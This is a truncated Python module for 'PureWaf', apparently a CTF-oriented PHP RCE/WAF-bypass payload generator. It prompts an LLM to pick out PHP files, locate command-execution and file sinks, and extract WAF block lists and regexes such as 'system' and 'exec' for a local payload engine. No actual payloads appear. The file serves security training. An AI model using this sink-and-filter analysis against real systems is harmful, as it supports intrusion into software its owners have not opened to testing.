import base64
import json
import os
import re
import shutil
import subprocess
import tempfile
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Sequence, Set, Tuple
from urllib import error
from urllib import request


AGENT_STATE_FILENAME = "purewaf_agent_state.json"
AGENT_MAX_STEPS = 10
AGENT_ORIGINAL_TASK = (
    "PureWaf agent AUTO must run in three stages: identify sinks/vulnerability "
    "points, hand structured analysis to PureWaf for local payload generation, "
    "then verify/review generated payloads and provide one fallback payload only "
    "when local generation cannot produce a usable answer."
)
AGENT_SECURITY_BOUNDARY = (
    "PureWaf is a CTF and education-oriented PHP RCE/WAF-bypass payload generator, "
    "not a scanner, target prober, or interactive shell. Use only supplied project "
    "source and PureWaf outputs. Do not read secrets from .env except LLM config, "
    "do not write payloads into the local library, and do not use arbitrary user "
    "tools outside the payload validation sandbox."
)
ALLOWED_SINK_KINDS = {"command_exec", "file_read_path", "file_write_upload"}
ALLOWED_PAYLOAD_CONTEXTS = {"shell_command", "php_code", "file_path", "url_query_value", "any"}
MIN_CONFIDENCE = 0.6
PHP_PROJECT_EXTENSIONS = {".php", ".phtml", ".inc"}
PROJECT_SKIP_DIRS = {".git", "__MACOSX", "node_modules", "vendor"}
MAX_PROJECT_FILES = 80
MAX_PROJECT_FILE_BYTES = 1024 * 1024
MAX_PROJECT_SOURCE_BYTES = 2 * 1024 * 1024
MAX_AGENT_HISTORY = 24
MAX_AGENT_MEMORY_VALUE = 500
MAX_AGENT_SUMMARY_VALUE = 320
MAX_VALIDATION_PAYLOADS = 3
VALIDATION_TIMEOUT_SECONDS = 5


class AgentStepLimitExceeded(RuntimeError):
    """Raised when an agent AUTO session reaches its bounded step budget."""


def _now_epoch() -> float:
    return round(time.time(), 3)


def _compact_text(value, limit: int = MAX_AGENT_SUMMARY_VALUE) -> str:
    text = re.sub(r"\s+", " ", str(value or "")).strip()
    if len(text) <= limit:
        return text
    return text[: max(limit - 3, 0)] + "..."


def _compact_value(value, limit: int = MAX_AGENT_SUMMARY_VALUE):
    if isinstance(value, dict):
        compacted = {}
        for key, item in list(value.items())[:12]:
            compacted[str(key)] = _compact_value(item, limit=limit)
        return compacted
    if isinstance(value, (list, tuple, set)):
        return [_compact_value(item, limit=limit) for item in list(value)[:12]]
    if isinstance(value, (bool, int, float)) or value is None:
        return value
    return _compact_text(value, limit=limit)


class PureWafAgentSession:
    """Small persisted state/memory file for one bounded agent AUTO run."""

    def __init__(
        self,
        cwd: Optional[Path] = None,
        max_steps: int = AGENT_MAX_STEPS,
        state_filename: str = AGENT_STATE_FILENAME,
    ):
        self.cwd = Path(cwd) if cwd is not None else Path.cwd()
        self.max_steps = int(max_steps)
        self.state_path = self.cwd / state_filename
        self.session_id = uuid.uuid4().hex
        self.current_step = 0
        self.phase = "initialized"
        self.status = "running"
        self.history: List[Dict[str, object]] = []
        self.memory: Dict[str, object] = {}
        self.tool_results: List[Dict[str, object]] = []
        self.error = ""
        self.write_state()

    def start_phase(self, phase: str, summary=None):
        self.phase = str(phase or "").strip() or self.phase
        self._append_history(
            {
                "step": self.current_step,
                "phase": self.phase,
                "action": "start_phase",
                "summary": _compact_value(summary),
                "time": _now_epoch(),
            }
        )
        self.write_state()

    def step(self, phase: str, action: str, summary=None) -> int:
        if self.current_step >= self.max_steps:
            self.status = "step_limit_exceeded"
            self.error = f"agent step limit exceeded: {self.current_step}/{self.max_steps}"
            self.write_state()
            raise AgentStepLimitExceeded(self.error)
        self.current_step += 1
        self.phase = str(phase or "").strip() or self.phase
        self._append_history(
            {
                "step": self.current_step,
                "phase": self.phase,
                "action": _compact_text(action, limit=80),
                "summary": _compact_value(summary),
                "time": _now_epoch(),
            }
        )
        self.write_state()
        return self.current_step

    def remember(self, key: str, value):
        clean_key = re.sub(r"[^A-Za-z0-9_.-]+", "_", str(key or "").strip())[:80]
        if not clean_key:
            return
        self.memory[clean_key] = _compact_value(value, limit=MAX_AGENT_MEMORY_VALUE)
        self.write_state()

    def record_tool_result(self, tool: str, summary):
        self.tool_results.append(
            {
                "tool": _compact_text(tool, limit=80),
                "summary": _compact_value(summary),
                "time": _now_epoch(),
            }
        )
        self.tool_results = self.tool_results[-MAX_AGENT_HISTORY:]
        self.write_state()

    def fail(self, error_text: str):
        self.status = "failed"
        self.error = _compact_text(error_text, limit=MAX_AGENT_MEMORY_VALUE)
        self.write_state()

    def finish(self, summary=None):
        self.status = "completed"
        self.remember("final_summary", summary or {})
        self.write_state()

    def as_dict(self) -> Dict[str, object]:
        return {
            "session_id": self.session_id,
            "max_steps": self.max_steps,
            "current_step": self.current_step,
            "phase": self.phase,
            "status": self.status,
            "error": self.error,
            "memory": self.memory,
            "history": self.history[-MAX_AGENT_HISTORY:],
            "tool_results": self.tool_results[-MAX_AGENT_HISTORY:],
        }

    def write_state(self):
        self.cwd.mkdir(parents=True, exist_ok=True)
        tmp_path = self.state_path.with_name(self.state_path.name + ".tmp")
        data = self.as_dict()
        tmp_path.write_text(
            json.dumps(data, ensure_ascii=False, indent=2, sort_keys=True),
            encoding="utf-8",
        )
        os.replace(tmp_path, self.state_path)

    def _append_history(self, item: Dict[str, object]):
        self.history.append(item)
        self.history = self.history[-MAX_AGENT_HISTORY:]


@dataclass(frozen=True)
class LlmSinkCandidate:
    function: str
    kind: str
    payload_context: str
    argument_index: int = 0
    confidence: float = 0.0
    evidence: str = ""

    def as_dict(self) -> Dict[str, object]:
        return {
            "function": self.function,
            "kind": self.kind,
            "payload_context": self.payload_context,
            "argument_index": self.argument_index,
            "confidence": self.confidence,
            "evidence": self.evidence,
        }


@dataclass
class LlmWafExtraction:
    waf_words: List[str] = field(default_factory=list)
    waf_chars: List[str] = field(default_factory=list)
    waf_regex: List[str] = field(default_factory=list)
    limit_length: Optional[int] = None
    confidence: float = 0.0


@dataclass(frozen=True)
class AgentRoute:
    path: str = ""
    method: str = "GET"

    def as_dict(self) -> Dict[str, str]:
        return {
            "path": self.path,
            "method": self.method,
        }


@dataclass(frozen=True)
class AgentInputRef:
    source: str = ""
    key: str = ""

    def as_dict(self) -> Dict[str, str]:
        return {
            "source": self.source,
            "key": self.key,
        }


@dataclass(frozen=True)
class AgentDataflowStep:
    kind: str = ""
    code: str = ""
    function: str = ""
    before_transform: bool = False
    effect: str = ""

    def as_dict(self) -> Dict[str, object]:
        return {
            "kind": self.kind,
            "code": self.code,
            "function": self.function,
            "before_transform": self.before_transform,
            "effect": self.effect,
        }


@dataclass
class AgentTransformChain:
    route: AgentRoute = field(default_factory=AgentRoute)
    input_ref: AgentInputRef = field(default_factory=AgentInputRef)
    sink_kind: str = ""
    sink_function: str = ""
    sink_argument: str = ""
    steps: List[AgentDataflowStep] = field(default_factory=list)
    strategy_hints: List[str] = field(default_factory=list)

    def as_dict(self) -> Dict[str, object]:
        return {
            "route": self.route.as_dict(),
            "input": self.input_ref.as_dict(),
            "sink": {
                "kind": self.sink_kind,
                "function": self.sink_function,
                "argument": self.sink_argument,
            },
            "dataflow": [step.as_dict() for step in self.steps],
            "strategy_hints": list(self.strategy_hints),
        }


@dataclass
class LlmSinkAnalysis:
    enabled: bool = False
    used: bool = False
    model: str = ""
    endpoint: str = ""
    candidates: List[LlmSinkCandidate] = field(default_factory=list)
    waf_extraction: Optional[LlmWafExtraction] = None
    transform_chain: Optional[AgentTransformChain] = None
    error: str = ""


@dataclass(frozen=True)
class ProjectSourceFile:
    path: str
    content: str
    size: int
    truncated: bool = False


@dataclass
class ProjectSourceBundle:
    root: Path
    files: List[ProjectSourceFile] = field(default_factory=list)
    selected_paths: List[str] = field(default_factory=list)
    source: str = ""
    analysis_lines: List[str] = field(default_factory=list)
    selection_error: str = ""


@dataclass
class LlmPayloadReview:
    used: bool = False
    model: str = ""
    endpoint: str = ""
    valid: bool = False
    fallback_payload: str = ""
    payload_value: str = ""
    request_path: str = ""
    request_headers: Dict[str, str] = field(default_factory=dict)
    request_cookies: Dict[str, str] = field(default_factory=dict)
    payload_context: str = ""
    source: str = ""
    evidence: str = ""
    notes: str = ""
    error: str = ""


@dataclass(frozen=True)
class PayloadValidationResult:
    payload: str
    sink_kind: str = ""
    payload_context: str = "any"
    attempted: bool = False
    passed: bool = False
    skipped: bool = False
    reason: str = ""
    output_excerpt: str = ""

    def as_dict(self) -> Dict[str, object]:
        return {
            "payload": _compact_text(self.payload, limit=180),
            "sink_kind": self.sink_kind,
            "payload_context": self.payload_context,
            "attempted": self.attempted,
            "passed": self.passed,
            "skipped": self.skipped,
            "reason": _compact_text(self.reason, limit=220),
            "output_excerpt": _compact_text(self.output_excerpt, limit=220),
        }


@dataclass(frozen=True)
class _LlmSettings:
    api_key: str
    base_url: str
    model: str


class PureWafLlmSinkAgent:
    """Optional LLM-assisted sink detection for PureWaf AUTO mode."""

    def __init__(
        self,
        cwd: Optional[Path] = None,
        timeout: int = 20,
        skill_path: Optional[Path] = None,
        session: Optional[PureWafAgentSession] = None,
    ):
        self.cwd = Path(cwd) if cwd is not None else Path.cwd()
        self.timeout = timeout
        self.skill_path = Path(skill_path) if skill_path is not None else None
        self.session = session

    def analyze_php(self, source: str) -> LlmSinkAnalysis:
        settings, error = self._load_settings()
        if error:
            if self.session:
                self.session.record_tool_result("llm_sink_analysis", {"error": error})
            return LlmSinkAnalysis(error=error)

        content, endpoint, chat_error = self._chat_completion(
            settings,
            self.build_messages(source),
            max_tokens=1200,
        )
        if chat_error:
            if self.session:
                self.session.record_tool_result("llm_sink_analysis", {"error": chat_error})
            return LlmSinkAnalysis(
                enabled=True,
                used=True,
                model=settings.model,
                endpoint=endpoint,
                error=chat_error,
            )

        try:
            parsed = self._load_json_content(content)
            candidates = self._parse_candidates_from_parsed(parsed)
            waf_extraction = self._parse_waf_extraction(parsed)
            transform_chain = self._parse_transform_chain(parsed)
        except Exception as exc:
            if self.session:
                self.session.record_tool_result("llm_sink_analysis", {"error": str(exc)})
            return LlmSinkAnalysis(
                enabled=True,
                used=True,
                model=settings.model,
                endpoint=endpoint,
                error=f"LLM response invalid: {exc}",
            )

        if self.session:
            self.session.record_tool_result(
                "llm_sink_analysis",
                {
                    "model": settings.model,
                    "candidate_count": len(candidates),
                    "candidates": [candidate.as_dict() for candidate in candidates[:3]],
                    "waf_extraction": waf_extraction is not None,
                    "transform_chain": transform_chain.as_dict() if transform_chain else None,
                },
            )
        return LlmSinkAnalysis(
            enabled=True,
            used=True,
            model=settings.model,
            endpoint=endpoint,
            candidates=candidates,
            waf_extraction=waf_extraction,
            transform_chain=transform_chain,
        )

    def _chat_completion(
        self,
        settings: "_LlmSettings",
        messages: List[Dict[str, str]],
        max_tokens: int,
        max_retries: int = 2,
    ) -> Tuple[str, str, str]:
        endpoint = self._normalize_chat_completions_url(settings.base_url)
        if self.session:
            self.session.step(
                "llm_call",
                "chat_completion",
                {
                    "model": settings.model,
                    "endpoint": endpoint,
                    "messages": len(messages),
                    "max_tokens": max_tokens,
                },
            )
        body = {
            "model": settings.model,
            "messages": messages,
            "temperature": 0,
            "max_tokens": max_tokens,
        }
        req_data = json.dumps(body).encode("utf-8")

        last_error = ""
        for attempt in range(max_retries + 1):
            req = request.Request(
                endpoint,
                data=req_data,
                headers={
                    "Authorization": f"Bearer {settings.api_key}",
                    "Content-Type": "application/json",
                },
                method="POST",
            )
            try:
                with request.urlopen(req, timeout=self.timeout) as response:
                    raw = response.read().decode("utf-8", "replace")
                try:
                    payload = json.loads(raw)
                    content = payload["choices"][0]["message"]["content"]
                except Exception as exc:
                    return "", endpoint, f"LLM response invalid: {exc}"
                return str(content), endpoint, ""
            except error.HTTPError as exc:
                last_error = self._format_http_error(exc, endpoint, settings)
                status_code = getattr(exc, "code", 0)
                if status_code in (429, 500, 502, 503, 504) and attempt < max_retries:
                    time.sleep(1.5 * (attempt + 1))
                    continue
                return "", endpoint, last_error
            except Exception as exc:
                last_error = f"LLM request failed: {exc}"
                if attempt < max_retries:
                    time.sleep(1.0 * (attempt + 1))
                    continue
                return "", endpoint, last_error

        return "", endpoint, last_error

    @staticmethod
    def _format_http_error(exc: error.HTTPError, endpoint: str, settings: "_LlmSettings") -> str:
        try:
            body = exc.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        body = re.sub(r"\s+", " ", body).strip()
        if settings.api_key:
            body = body.replace(settings.api_key, "[REDACTED_API_KEY]")
        body = body[:700]
        status = f"HTTP {getattr(exc, 'code', '')} {getattr(exc, 'reason', '')}".strip()
        details = [status, f"endpoint={endpoint}", f"model={settings.model}"]
        if body:
            details.append(f"response={body}")
        return "LLM request failed: " + " | ".join(details)

    def _immutable_context(self, stage_goal: str) -> str:
        step_text = f"Max loop/step budget: {AGENT_MAX_STEPS}."
        if self.session:
            step_text = (
                f"Current bounded agent step: {self.session.current_step}/"
                f"{self.session.max_steps}."
            )
        return (
            "Immutable PureWaf agent context:\n"
            f"- Original task: {AGENT_ORIGINAL_TASK}\n"
            f"- Security boundary: {AGENT_SECURITY_BOUNDARY}\n"
            f"- Current stage goal: {stage_goal}\n"
            f"- {step_text}"
        )

    def build_messages(self, source: str) -> List[Dict[str, str]]:
        skill_guide = self._load_skill_guide()
        return [
            {
                "role": "system",
                "content": (
                    self._immutable_context(
                        "Stage 1 sink and vulnerability-point identification only."
                    )
                    + "\n\n"
                    "You are a CTF Web expert assisting PureWaf AUTO sink analysis. PureWaf is "
                    "a CTF and education-oriented PHP RCE/WAF-bypass payload generator, not a scanner. "
                    "The primary CTF objective is to identify how user-controlled data can reach "
                    "a sink that may help get FLAG. "
                    "AUTO mode analyzes one PHP source file to identify the sink, input source, "
                    "filters, transformation/dataflow chain, and execution context, then PureWaf's local payload engine generates "
                    "and filters candidates. Allowed sink kinds are only: command_exec, "
                    "file_read_path, file_write_upload. Allowed payload_context values are only: "
                    "shell_command, php_code, file_path, url_query_value, any. For file_read_path "
                    "prefer file_path unless the answer must be a raw HTTP query value. Do not generate payloads. Do not provide exploit "
                    "steps. Do not use external project knowledge or web content. If the source is "
                    "insufficient, return an empty sinks array.\n\n"
                    "In addition to sinks, you MUST also extract WAF/filter constraints from the "
                    "source code. Identify blocked words (strings checked via strpos, stripos, "
                    "str_contains, in_array, etc.), blocked characters, regex patterns used for "
                    "filtering (preg_match), and length limits (strlen). Return these in the waf "
                    "field. If no WAF constraints are found, return waf as null.\n\n"
                    "Return only JSON in this shape: "
                    "{\"sinks\":[{\"function\":\"name\",\"kind\":\"command_exec\","
                    "\"payload_context\":\"shell_command\",\"argument_index\":0,"
                    "\"confidence\":0.0,\"evidence\":\"short source-based reason\"}],"
                    "\"route\":{\"path\":\"/preview.php\",\"method\":\"GET\"},"
                    "\"input\":{\"source\":\"GET\",\"key\":\"f\"},"
                    "\"sink\":{\"kind\":\"file_read_path\",\"function\":\"file_get_contents\","
                    "\"argument\":\"$path\"},"
                    "\"dataflow\":[{\"kind\":\"filter\",\"code\":\"preg_match(...)\","
                    "\"function\":\"preg_match\",\"before_transform\":true,"
                    "\"effect\":\"blocks raw input before conversion\"}],"
                    "\"strategy_hints\":[\"avoid literal filtered words before transform\"],"
                    "\"waf\":{\"blocked_words\":[\"system\",\"exec\"],"
                    "\"blocked_chars\":[\" \",\";\"],"
                    "\"regex_patterns\":[\"/system|exec/i\"],"
                    "\"length_limit\":null,"
                    "\"confidence\":0.85,"
                    "\"evidence\":\"short source-based reason\"}}.\n\n"
                    "PureWaf tool usage guide from skills/SKILL.md:\n"
                    f"{skill_guide}"
                ),
            },
            {
                "role": "user",
                "content": (
                    "Analyze this PHP source for PureWaf AUTO sink detection and WAF extraction. "
                    "Return only sink metadata and WAF constraints JSON.\n\n"
                    f"{source or ''}"
                ),
            },
        ]

    def _load_skill_guide(self) -> str:
        candidates: List[Path] = []
        if self.skill_path is not None:
            candidates.append(self.skill_path)
        candidates.append(self.cwd / "skills" / "SKILL.md")
        candidates.append(Path(__file__).resolve().parents[1] / "skills" / "SKILL.md")

        for path in candidates:
            try:
                if path.exists():
                    return path.read_text(encoding="utf-8", errors="replace")[:4000]
            except Exception:
                continue

        return (
            "PureWaf AUTO accepts a single PHP source file, identifies sink metadata, "
            "then lets the local PureWaf engine generate and filter payloads. LLM output "
            "must stay metadata-only and must not contain payloads or exploit steps."
        )

    def _load_settings(self) -> Tuple[Optional[_LlmSettings], str]:
        env_path = self.cwd / ".env"
        if not env_path.exists():
            return None, "LLM skipped: .env not found"

        values = self._read_env_file(env_path)
        api_key = self._first_value(values, ("PUREWAF_LLM_API_KEY", "API_KEY"))
        base_url = self._first_value(values, ("PUREWAF_LLM_BASE_URL", "BASE_URL"))
        model = self._first_value(values, ("PUREWAF_LLM_MODEL", "LLM_MODEL", "MODEL"))

        if not api_key:
            return None, "LLM skipped: API_KEY missing in .env"
        if not base_url:
            return None, "LLM skipped: BASE_URL missing in .env"
        if not model:
            return None, "LLM skipped: MODEL missing in .env"

        return _LlmSettings(api_key=api_key, base_url=base_url, model=model), ""

    def _read_env_file(self, env_path: Path) -> Dict[str, str]:
        try:
            from dotenv import dotenv_values

            return {key: str(value) for key, value in dotenv_values(env_path).items() if value is not None}
        except Exception:
            return self._read_env_file_fallback(env_path)

    @staticmethod
    def _read_env_file_fallback(env_path: Path) -> Dict[str, str]:
        values: Dict[str, str] = {}
        for raw_line in env_path.read_text(encoding="utf-8", errors="replace").splitlines():
            line = raw_line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, value = line.split("=", 1)
            key = key.strip()
            value = value.strip().strip("'\"")
            if key:
                values[key] = value
        return values

    @staticmethod
    def _first_value(values: Dict[str, str], keys: Iterable[str]) -> str:
        for key in keys:
            value = str(values.get(key, "") or "").strip()
            if value:
                return value
        return ""

    @staticmethod
    def _normalize_chat_completions_url(base_url: str) -> str:
        normalized = (base_url or "").strip().rstrip("/")
        if normalized.endswith("/chat/completions"):
            return normalized
        if normalized.endswith("/v1"):
            return normalized + "/chat/completions"
        return normalized + "/v1/chat/completions"

    def _parse_candidates(self, content: str) -> List[LlmSinkCandidate]:
        parsed = self._load_json_content(content)
        return self._parse_candidates_from_parsed(parsed)

    def _parse_candidates_from_parsed(self, parsed: Dict) -> List[LlmSinkCandidate]:
        raw_sinks = parsed.get("sinks", [])
        if not isinstance(raw_sinks, list):
            return []

        candidates: List[LlmSinkCandidate] = []
        for item in raw_sinks:
            candidate = self._coerce_candidate(item)
            if candidate is not None:
                candidates.append(candidate)
        return candidates

    @staticmethod
    def _parse_waf_extraction(parsed: Dict) -> Optional[LlmWafExtraction]:
        raw = parsed.get("waf")
        if not isinstance(raw, dict):
            return None
        words = [
            str(w).strip()
            for w in (raw.get("blocked_words") or [])
            if isinstance(w, str) and str(w).strip()
        ]
        chars = [
            str(c)
            for c in (raw.get("blocked_chars") or [])
            if isinstance(c, str) and len(c) == 1
        ]
        regexes = [
            str(r).strip()
            for r in (raw.get("regex_patterns") or [])
            if isinstance(r, str) and str(r).strip()
        ]
        limit = raw.get("length_limit")
        if limit is not None:
            try:
                limit = int(limit)
                if limit <= 0:
                    limit = None
            except (TypeError, ValueError):
                limit = None
        try:
            confidence = max(0.0, min(1.0, float(raw.get("confidence", 0.0))))
        except (TypeError, ValueError):
            confidence = 0.0
        if not words and not chars and not regexes and limit is None:
            return None
        return LlmWafExtraction(
            waf_words=words[:50],
            waf_chars=chars[:30],
            waf_regex=regexes[:5],
            limit_length=limit,
            confidence=confidence,
        )

    @staticmethod
    def _parse_transform_chain(parsed: Dict) -> Optional[AgentTransformChain]:
        route_raw = parsed.get("route")
        input_raw = parsed.get("input")
        sink_raw = parsed.get("sink")
        steps_raw = parsed.get("dataflow")
        hints_raw = parsed.get("strategy_hints")

        route = AgentRoute()
        if isinstance(route_raw, dict):
            path = _compact_text(route_raw.get("path", ""), limit=220)
            method = _compact_text(route_raw.get("method", "GET"), limit=12).upper() or "GET"
            route = AgentRoute(path=path, method=method)

        input_ref = AgentInputRef()
        if isinstance(input_raw, dict):
            source = _compact_text(input_raw.get("source", ""), limit=24).upper()
            key = _compact_text(input_raw.get("key", ""), limit=120)
            input_ref = AgentInputRef(source=source, key=key)

        sink_kind = ""
        sink_function = ""
        sink_argument = ""
        if isinstance(sink_raw, dict):
            sink_kind = _compact_text(sink_raw.get("kind", ""), limit=40)
            sink_function = _compact_text(sink_raw.get("function", ""), limit=80)
            sink_argument = _compact_text(
                sink_raw.get("argument", sink_raw.get("argument_expr", "")),
                limit=220,
            )

        steps: List[AgentDataflowStep] = []
        if isinstance(steps_raw, list):
            for item in steps_raw[:16]:
                if not isinstance(item, dict):
                    continue
                steps.append(
                    AgentDataflowStep(
                        kind=_compact_text(item.get("kind", ""), limit=40),
                        code=_compact_text(item.get("code", ""), limit=240),
                        function=_compact_text(item.get("function", ""), limit=80),
                        before_transform=bool(item.get("before_transform", False)),
                        effect=_compact_text(item.get("effect", ""), limit=240),
                    )
                )

        hints = [
            _compact_text(item, limit=160)
            for item in (hints_raw if isinstance(hints_raw, list) else [])
            if str(item or "").strip()
        ][:12]

        if not any(
            [
                route.path,
                input_ref.key,
                sink_kind,
                sink_function,
                sink_argument,
                steps,
                hints,
            ]
        ):
            return None

        return AgentTransformChain(
            route=route,
            input_ref=input_ref,
            sink_kind=sink_kind,
            sink_function=sink_function,
            sink_argument=sink_argument,
            steps=steps,
            strategy_hints=hints,
        )

    @staticmethod
    def _load_json_content(content: str) -> Dict[str, object]:
        text = (content or "").strip()
        if text.startswith("```"):
            text = re.sub(r"^```(?:json)?\s*", "", text, flags=re.I)
            text = re.sub(r"\s*```$", "", text)
        try:
            loaded = json.loads(text)
        except json.JSONDecodeError:
            start = text.find("{")
            end = text.rfind("}")
            if start == -1 or end == -1 or end < start:
                raise
            loaded = json.loads(text[start : end + 1])
        if not isinstance(loaded, dict):
            return {"sinks": []}
        return loaded

    @staticmethod
    def _coerce_candidate(item) -> Optional[LlmSinkCandidate]:
        if not isinstance(item, dict):
            return None

        function = str(item.get("function", "") or "").strip()
        kind = str(item.get("kind", "") or "").strip()
        payload_context = str(item.get("payload_context", "") or "").strip()
        evidence = str(item.get("evidence", "") or "").strip()

        if not re.fullmatch(r"[A-Za-z_]\w*", function):
            return None
        if kind not in ALLOWED_SINK_KINDS:
            return None
        if kind == "file_read_path" and payload_context == "any":
            payload_context = "file_path"
        if payload_context not in ALLOWED_PAYLOAD_CONTEXTS:
            return None

        try:
            argument_index = int(item.get("argument_index", 0))
            confidence = float(item.get("confidence", 0.0))
        except (TypeError, ValueError):
            return None

        if argument_index < 0:
            return None
        if confidence < MIN_CONFIDENCE:
            return None

        return LlmSinkCandidate(
            function=function,
            kind=kind,
            payload_context=payload_context,
            argument_index=argument_index,
            confidence=confidence,
            evidence=evidence[:240],
        )


class PureWafProjectAgent(PureWafLlmSinkAgent):
    """Project-level LLM helper for PureWaf agent AUTO mode."""

    def scan_project_files(self, project_dir: Path) -> List[ProjectSourceFile]:
        files = self._scan_project_files_by_extension(
            project_dir,
            PHP_PROJECT_EXTENSIONS,
            MAX_PROJECT_FILES,
            MAX_PROJECT_FILE_BYTES,
        )

        if not files:
            raise ValueError("no PHP files found in project")
        return files

    @staticmethod
    def _scan_project_files_by_extension(
        project_dir: Path,
        extensions: Set[str],
        max_files: int,
        max_bytes: int,
    ) -> List[ProjectSourceFile]:
        root = Path(project_dir).resolve()
        if not root.is_dir():
            raise ValueError("project directory not found")

        files: List[ProjectSourceFile] = []
        for path in sorted(root.rglob("*")):
            if path.is_symlink():
                continue
            if not path.is_file():
                continue
            rel_parts = path.relative_to(root).parts
            if any(part in PROJECT_SKIP_DIRS for part in rel_parts[:-1]):
                continue
            if path.suffix.lower() not in extensions:
                continue

            size = path.stat().st_size
            with path.open("rb") as handle:
                raw = handle.read(max_bytes + 1)
            truncated = len(raw) > max_bytes
            content = raw[:max_bytes].decode("utf-8", "replace")
            files.append(
                ProjectSourceFile(
                    path=path.relative_to(root).as_posix(),
                    content=content,
                    size=size,
                    truncated=truncated,
                )
            )
            if len(files) >= max_files:
                break
        return files

    def build_project_source(self, project_dir: Path) -> ProjectSourceBundle:
        if self.session:
            self.session.start_phase(
                "stage_1_project_source",
                {"project_dir": str(project_dir), "allowed_extensions": sorted(PHP_PROJECT_EXTENSIONS)},
            )
        root = Path(project_dir).resolve()
        files = self.scan_project_files(root)
        selected_paths, selection_error = self.select_project_files(files)
        if not selected_paths:
            selected_paths = [file.path for file in files]

        selected_set = set(selected_paths)
        selected_files = [file for file in files if file.path in selected_set]
        source = self.render_project_source(selected_files)
        lines = [
            f"[*] AGENT: scanned PHP files => {len(files)}",
            f"[*] AGENT: selected PHP files => {len(selected_files)}",
        ]
        if selection_error:
            lines.append(f"[*] AGENT: file selection fallback => {selection_error}")
        if selected_paths:
            lines.append(f"[*] AGENT: selected paths => {', '.join(selected_paths[:12])}")

        if self.session:
            self.session.remember(
                "project_source",
                {
                    "scanned_php_files": len(files),
                    "selected_php_files": len(selected_files),
                    "selected_paths": selected_paths[:12],
                    "selection_error": selection_error,
                },
            )
            self.session.record_tool_result(
                "project_source_bundle",
                {
                    "source_bytes": len(source.encode("utf-8", "replace")),
                    "selected_php_files": len(selected_files),
                },
            )

        return ProjectSourceBundle(
            root=root,
            files=selected_files,
            selected_paths=selected_paths,
            source=source,
            analysis_lines=lines,
            selection_error=selection_error,
        )

    def select_project_files(
        self,
        files: Sequence[ProjectSourceFile],
    ) -> Tuple[List[str], str]:
        settings, error = self._load_settings()
        if error:
            if self.session:
                self.session.record_tool_result("llm_project_selection", {"error": error})
            return [], error

        content, _endpoint, chat_error = self._chat_completion(
            settings,
            self.build_project_selection_messages(files),
            max_tokens=1400,
        )
        if chat_error:
            if self.session:
                self.session.record_tool_result("llm_project_selection", {"error": chat_error})
            return [], chat_error

        valid_paths = {file.path for file in files}
        try:
            parsed = PureWafLlmSinkAgent._load_json_content(content)
            selected = self._parse_selected_paths_from_parsed(parsed, valid_paths)
            self._last_combined_parsed = parsed
        except Exception as exc:
            if self.session:
                self.session.record_tool_result("llm_project_selection", {"error": str(exc)})
            return [], f"LLM project selection invalid: {exc}"
        if self.session:
            transform_chain = self._parse_transform_chain(parsed)
            self.session.record_tool_result(
                "llm_project_selection",
                {
                    "selected_files": selected[:12],
                    "available_files": len(files),
                    "transform_chain": transform_chain.as_dict() if transform_chain else None,
                },
            )
        return selected, ""

    def get_combined_sink_analysis(self) -> Optional["LlmSinkAnalysis"]:
        """Return sink analysis from the combined file-selection+sink call, if available."""
        parsed = getattr(self, "_last_combined_parsed", None)
        if not parsed or not isinstance(parsed, dict):
            return None
        sinks_raw = parsed.get("sinks")
        if not isinstance(sinks_raw, list) or not sinks_raw:
            return None
        candidates = self._parse_candidates_from_parsed(parsed)
        waf_extraction = self._parse_waf_extraction(parsed)
        transform_chain = self._parse_transform_chain(parsed)
        if not candidates:
            return None
        settings, _ = self._load_settings()
        model = settings.model if settings else ""
        return LlmSinkAnalysis(
            enabled=True,
            used=True,
            model=model,
            endpoint="",
            candidates=candidates,
            waf_extraction=waf_extraction,
            transform_chain=transform_chain,
        )

    def build_project_selection_messages(
        self,
        files: Sequence[ProjectSourceFile],
    ) -> List[Dict[str, str]]:
        file_blocks = []
        for file in files:
            excerpt = file.content[:1600]
            file_blocks.append(
                f"PATH: {file.path}\nSIZE: {file.size}\nTRUNCATED: {file.truncated}\n"
                f"EXCERPT:\n{excerpt}"
            )
        return [
            {
                "role": "system",
                "content": (
                    self._immutable_context(
                        "Stage 1 combined: project file selection + sink/WAF identification."
                    )
                    + "\n\n"
                    "You are a CTF Web expert analyzing a PHP project for PureWaf agent AUTO mode. "
                    "The primary objective is to understand the path to getting FLAG. "
                    "Perform TWO tasks in one response:\n"
                    "1. Select project files relevant to user input, filtering, routing, and "
                    "dangerous sink reachability.\n"
                    "2. From the excerpts, identify sinks and WAF constraints if visible.\n\n"
                    "Allowed sink kinds: command_exec, file_read_path, file_write_upload. "
                    "Allowed payload_context values: shell_command, php_code, file_path, "
                    "url_query_value, any. For file_read_path prefer file_path unless the "
                    "complete exploit must be an HTTP query value.\n\n"
                    "Also preserve project semantics: identify the route/path, the input "
                    "source/key, whether filters run before transforms, and any conversion "
                    "chain that changes the value before the sink. Do not collapse this into "
                    "only sink_kind plus WAF words.\n\n"
                    "Return only JSON shaped as:\n"
                    "{\"selected_files\":[\"relative/path.php\"],\"reason\":\"short reason\","
                    "\"route\":{\"path\":\"/preview.php\",\"method\":\"GET\"},"
                    "\"input\":{\"source\":\"GET\",\"key\":\"f\"},"
                    "\"sink\":{\"kind\":\"file_read_path\",\"function\":\"file_get_contents\","
                    "\"argument\":\"$convertedPath\"},"
                    "\"dataflow\":[{\"kind\":\"filter\",\"code\":\"preg_match(...)\","
                    "\"function\":\"preg_match\",\"before_transform\":true,"
                    "\"effect\":\"raw input is checked before path conversion\"}],"
                    "\"strategy_hints\":[\"target the value after conversion\"],"
                    "\"sinks\":[{\"function\":\"name\",\"kind\":\"command_exec\","
                    "\"payload_context\":\"shell_command\",\"argument_index\":0,"
                    "\"confidence\":0.0,\"evidence\":\"short reason\"}],"
                    "\"waf\":{\"blocked_words\":[],\"blocked_chars\":[],"
                    "\"regex_patterns\":[],\"length_limit\":null,"
                    "\"confidence\":0.0,\"evidence\":\"short reason\"}}\n\n"
                    "If sinks or WAF are not identifiable from excerpts alone, return empty "
                    "sinks array and waf as null. Do not generate payloads."
                ),
            },
            {
                "role": "user",
                "content": "Project PHP file inventory:\n\n"
                + "\n\n---\n\n".join(file_blocks),
            },
        ]

    @staticmethod
    def _parse_selected_paths(content: str, valid_paths: Set[str]) -> List[str]:
        parsed = PureWafLlmSinkAgent._load_json_content(content)
        return PureWafProjectAgent._parse_selected_paths_from_parsed(parsed, valid_paths)

    @staticmethod
